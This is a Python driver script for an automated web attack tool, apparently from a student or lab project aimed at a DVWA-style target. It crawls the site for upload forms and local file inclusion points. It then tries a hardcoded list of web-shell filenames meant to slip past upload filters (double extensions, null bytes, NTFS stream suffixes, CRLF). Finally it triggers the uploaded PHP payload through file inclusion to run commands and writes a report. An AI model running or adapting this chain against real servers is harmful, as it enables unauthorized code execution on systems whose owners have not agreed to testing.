#!/usr/bin/env python3

from argparse import ArgumentParser
from sys import exit
import requests
from bs4 import BeautifulSoup
import urllib.parse
import crawler
import lfi
import uploadv2

# Target Configuration
URL = "http://ict2214p1b2.mooo.com/home.php"
UPLOAD_DIR_WORDLIST = "upload_dir_wordlist.txt"
WORDLIST = "wordlists/test"
COOKIE = {
    'PHPSESSID': 'sc52e0f84m8cu7jphv870vatv3',
    'security': 'medium'
}

PAYLOAD_FILENAME = "malicious.php"
REPORT_FILENAME = "vuln_report.txt"
CONTENT_TYPE_FILE = "content_type.txt"

# ✅ Required Payload Filenames
PAYLOAD_FILENAMES = [
    "shell.php.jpg",
    "shell.pHp5",
    "shell.png.php",
    "shell.php#.png",
    "shell.php%20",
    "shell.phpJunk123png",
    "shell.png.jpg.php",
    "shell.php%00.png",
    "shell.php...",
    "shell.php.png",
    "shell.asp::$data",
    "A" * 232 + ".php",
    "A" * 232 + ".png",
    "shell.php%0a",
    "shell.php%00",
    "shell.php%0d%0a",
    "shell.php%00.png%00.jpg"
]

def generate_report(uploaded_files, failed_files, executed_files):
    """Generate a detailed vulnerability report."""
    report = "Vulnerability Report\n"
    report += "====================\n"

    if uploaded_files:
        report += "\n✅ **Successfully Uploaded Files:**\n"
        for file in uploaded_files:
            report += f"- {file}\n"
    else:
        report += "\n❌ **No files were successfully uploaded.**\n"

    if failed_files:
        report += "\n🚫 **Failed Uploads:**\n"
        for file in failed_files:
            report += f"- {file}\n"

    if executed_files:
        report += "\n⚡ **Files Successfully Executed:**\n"
        for file in executed_files:
            report += f"- {file}\n"
    else:
        report += "\n⚠ **No files executed successfully.**\n"

    try:
        with open(REPORT_FILENAME, "w") as f:
            f.write(report)
        print(f"[+] Report generated successfully: {REPORT_FILENAME}")
    except Exception as e:
        print(f"[-] Error writing report file: {e}")

def main():
    session = requests.Session()
    
    # 🔍 Step 1: Crawl for URLs
    found_urls, uploadable_urls = crawler.main_crawl(URL, WORDLIST, COOKIE)
    print("Crawling complete.")

    found_urls = crawler.clean_found_urls(URL, found_urls)

    print("\nUploadable URLs:")
    for url in uploadable_urls:
        print(f"[+] {url}")

    print("\nPotential LFI vulnerabilities:")
    lfi_targets = crawler.check_lfi(found_urls)

    # 🔹 Step 2: Generate payloads
    generated_payloads = uploadv2.create_payloads()

    # 🔹 Step 3: Load MIME types
    mime_types = uploadv2.load_mime_types(CONTENT_TYPE_FILE)

    if not mime_types:
        print("[-] No MIME types found. Exiting.")
        exit(1)

    # 🔹 Step 4: Combine payload lists
    payload_filenames = PAYLOAD_FILENAMES + generated_payloads

    # 🔹 Step 5: Try Uploading Each Payload
    uploaded_files = []
    failed_files = []

    for url in uploadable_urls:
        for payload in payload_filenames:
            if uploadv2.upload_file(url, payload, COOKIE, CONTENT_TYPE_FILE):
                print(f"[+] File uploaded successfully: {payload} -> {url}")
                uploaded_files.append(url + "/" + payload)
            else:
                failed_files.append(payload)

    # 🔹 Step 6: Detect upload directory
    dynamic_upload_dir = uploadv2.get_upload_directory(URL, UPLOAD_DIR_WORDLIST, PAYLOAD_FILENAME, COOKIE)

    if not uploaded_files:
        print("[-] No files uploaded successfully. Report generated. Exiting.")
        generate_report(uploaded_files, failed_files, [])
        exit(1)

    if dynamic_upload_dir:
        print(f"[+] Detected Upload Directory: {dynamic_upload_dir}")
    else:
        print("[-] No valid upload directory found. Exiting.")
        generate_report(uploaded_files, failed_files, [])
        exit(1)

    # 🔹 Step 7: Test execution
    executed_files = []
    for target in lfi_targets:
        lfi_found_url = lfi.brute_force_lfi(target, dynamic_upload_dir + PAYLOAD_FILENAME, session, COOKIE)
        if lfi_found_url:
            print(f"[+] LFI Found at: {lfi_found_url}")
            command_results = lfi.trigger_payload_via_lfi(lfi_found_url, COOKIE)
            executed_files.append(lfi_found_url)

    # 🔹 Step 8: Generate Final Report
    generate_report(uploaded_files, failed_files, executed_files)

if __name__ == "__main__":
    main()
